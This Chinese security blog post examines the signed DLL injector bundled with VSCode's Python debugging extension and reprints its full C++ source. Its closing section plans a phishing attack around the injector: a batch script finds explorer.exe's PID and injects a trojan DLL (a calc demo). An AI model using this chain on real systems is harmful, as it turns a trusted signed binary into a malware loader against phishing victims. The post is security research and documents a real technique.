---
title: "VsCode扩展中的DLL注入器"
date: 2023-09-08
description: 早上 @Akkuman 说看到Vsocde中的扩展目录中有疑似签名过的DLL注入器，遂记录一下。
url: /archivers/2023-09-08/vscode-dll
tags: vscode
---

<aside>
💡 VSCode是一款由微软开发的免费且开源的代码编辑器，支持多种编程语言，可通过安装扩展包来进一步扩展其功能。VSCode的扩展包具有丰富的功能，包括但不限于代码片段、自动完成、调试工具、主题等。用户可以轻松地在VSCode中安装、管理和使用扩展包，以满足个人的编程需求。

</aside>

安装完毕Python调试扩展后，会在扩展目录中生成一些文件：

![0](https://images.payloads.online/2024-07-29-1ac07f2ccf6b6ba8768b96e62815f150289ca24887a111685646538b567130d5.png)  


![1](https://images.payloads.online/2024-07-29-8ba004d0a43efcfa27809998a10469e46d3e380ea3ed0c3122c60583d5a0ee6b.png)  

其中以下两个文件是DLL注入器，分别对应X86和X64位操作系统：

- inject_dll_x86.exe
- inject_dll_amd64.exe

在windows文件夹中还保留了注入器的源代码：

![2](https://images.payloads.online/2024-07-29-03d06e145c8996fcbaafefa67c5c28df4b4f53a9f77b69a21cfefebd0fea9d28.png)  


> 路径：`C:\Users\Administrator\.vscode\extensions\ms-python.python-2022.20.2\pythonFiles\lib\python\debugpy\_vendored\pydevd\pydevd_attach_to_process\windows`
> 

```cpp
// inject_dll.cpp
#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <tchar.h>
#include <tlhelp32.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")

// Helper to free data when we leave the scope.
class DataToFree {
public:
    HANDLE hProcess;
    HANDLE snapshotHandle;
    
    LPVOID remoteMemoryAddr;
    int remoteMemorySize;
    
    DataToFree(){
        this->hProcess = nullptr;
        this->snapshotHandle = nullptr;
        
        this->remoteMemoryAddr = nullptr;
        this->remoteMemorySize = 0;
    }
    
    ~DataToFree() {
        if(this->hProcess != nullptr){
            
            if(this->remoteMemoryAddr != nullptr && this->remoteMemorySize != 0){
                VirtualFreeEx(this->hProcess, this->remoteMemoryAddr, this->remoteMemorySize, MEM_RELEASE);
                this->remoteMemoryAddr = nullptr;
                this->remoteMemorySize = 0;
            }
            
            CloseHandle(this->hProcess);
            this->hProcess = nullptr;
        }

        if(this->snapshotHandle != nullptr){
            CloseHandle(this->snapshotHandle);
            this->snapshotHandle = nullptr;
        }
    }
};

/**
 * All we do here is load a dll in a remote program (in a remote thread).
 *
 * Arguments must be the pid and the dll name to run.
 *
 * i.e.: inject_dll.exe <pid> <dll path>
 */
int wmain( int argc, wchar_t *argv[ ], wchar_t *envp[ ] )
{
    std::cout << "Running executable to inject dll." << std::endl;
    
    // Helper to clear resources.
    DataToFree dataToFree;
    
    if(argc != 3){
        std::cout << "Expected 2 arguments (pid, dll name)." << std::endl;
        return 1;
    }
 
    const int pid = _wtoi(argv[1]);
    if(pid == 0){
        std::cout << "Invalid pid." << std::endl;
        return 2;
    }
    
    const int MAX_PATH_SIZE_PADDED = MAX_PATH + 1;
    char dllPath[MAX_PATH_SIZE_PADDED];
    memset(&dllPath[0], '\0', MAX_PATH_SIZE_PADDED);
    size_t pathLen = 0;
    wcstombs_s(&pathLen, dllPath, argv[2], MAX_PATH);
    
    const bool inheritable = false;
    const HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, inheritable, pid);
    if(hProcess == nullptr || hProcess == INVALID_HANDLE_VALUE){
        std::cout << "Unable to open process with pid: " << pid << ". Error code: " << GetLastError() << "." << std::endl;
        return 3;
    }
    dataToFree.hProcess = hProcess;
    std::cout << "OpenProcess with pid: " << pid << std::endl;
    
    const LPVOID remoteMemoryAddr = VirtualAllocEx(hProcess, nullptr, MAX_PATH_SIZE_PADDED, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if(remoteMemoryAddr == nullptr){
        std::cout << "Error. Unable to allocate memory in pid: " << pid << ". Error code: " << GetLastError() << "." << std::endl;
        return 4;
    }
    dataToFree.remoteMemorySize = MAX_PATH_SIZE_PADDED;
    dataToFree.remoteMemoryAddr = remoteMemoryAddr;
    
    std::cout << "VirtualAllocEx in pid: " << pid << std::endl;
    
    const bool written = WriteProcessMemory(hProcess, remoteMemoryAddr, dllPath, pathLen, nullptr);
    if(!written){
        std::cout << "Error. Unable to write to memory in pid: " << pid << ". Error code: " << GetLastError() << "." << std::endl;
        return 5;
    }
    std::cout << "WriteProcessMemory in pid: " << pid << std::endl;
    
    const LPVOID loadLibraryAddress = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if(loadLibraryAddress == nullptr){
        std::cout << "Error. Unable to get LoadLibraryA address. Error code: " << GetLastError() << "." << std::endl;
        return 6;
    }
    std::cout << "loadLibraryAddress: " << pid << std::endl;
    
    const HANDLE remoteThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE) loadLibraryAddress, remoteMemoryAddr, 0, nullptr);
    if (remoteThread == nullptr) {
        std::cout << "Error. Unable to CreateRemoteThread. Error code: " << GetLastError() << "." << std::endl;
        return 7;
    }
    
    // We wait for the load to finish before proceeding to get the function to actually do the attach.
    std::cout << "Waiting for LoadLibraryA to complete." << std::endl;
    DWORD result = WaitForSingleObject(remoteThread, 5 * 1000);
    
    if(result == WAIT_TIMEOUT) {
        std::cout << "WaitForSingleObject(LoadLibraryA thread) timed out." << std::endl;
        return 8;
        
    } else if(result == WAIT_FAILED) {
        std::cout << "WaitForSingleObject(LoadLibraryA thread) failed. Error code: " << GetLastError() << "." << std::endl;
        return 9;
    }
    
    std::cout << "Ok, finished dll injection." << std::endl;
    return 0;
}
```

签名情况：

![3](https://images.payloads.online/2024-07-29-86bbb43d1859d52ea12e73cc03a6b184a25e4f0239431b109b35aa49de3c27d9.png)  

使用方式，只需要两个参数：

- pid : 目标进程的进程ID
- dll name: 想要注入目标进程的DLL绝对路径

```cpp
C:\Users\Administrator\Downloads>inject_dll_amd64.exe
Running executable to inject dll.
Expected 2 arguments (pid, dll name).
```

测试效果：

![4](https://images.payloads.online/2024-07-29-d239af6fc3a3e340f245ce3f15dd9d50a35f4d1b876b14760207326feea194f0.png)  


滥用思路：

1. 钓鱼的时候可以发送一个BAT批处理脚本、dll注入器、dll木马
2. BAT批处理：获取x64进程的pid
3. BAT批处理：获取dll木马绝对路径
4. BAT批处理：执行dll注入器，将dll木马注入到目标进程中

![5](https://images.payloads.online/2024-07-29-6427dc8baed64cec09ed7934e49ef9188954f50c44761035110c9f7f93562fdd.png)  

```bash
@echo off
set target_process_name=explorer.exe
set dll_name=calc_x64.dll
set injecter=inject_dll_amd64.exe
for /f "tokens=2" %%i in ('tasklist ^| findstr /i "%target_process_name%"') do set "pid=%%i"
set "command=%CD%\%injecter% %pid% %CD%\%dll_name%"
%command%
```

**注意：被注入的DLL文件路径必须是绝对路径才可以注入成功**

最后的最后，致谢 @Akkuman